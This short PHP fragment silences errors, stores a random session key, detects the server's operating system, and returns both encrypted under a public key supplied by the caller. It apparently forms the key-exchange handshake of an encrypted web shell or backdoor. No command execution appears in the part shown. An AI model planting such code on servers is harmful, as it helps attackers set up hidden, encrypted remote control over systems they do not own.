
error_reporting(0);
$key = bin2hex(random_bytes(16));
$_SESSION["key"] = $key;
session_write_close();
$data_send = array('key' => $key, "os" => stristr(php_uname("s"), "win") ? "win" : "linux");
if ($pbk = openssl_pkey_get_public($data["pbk"])) {
    if (openssl_public_encrypt(json_encode($data_send), $cipher, $pbk, OPENSSL_PKCS1_OAEP_PADDING)) {
        echo base64_encode($cipher);
    }
}
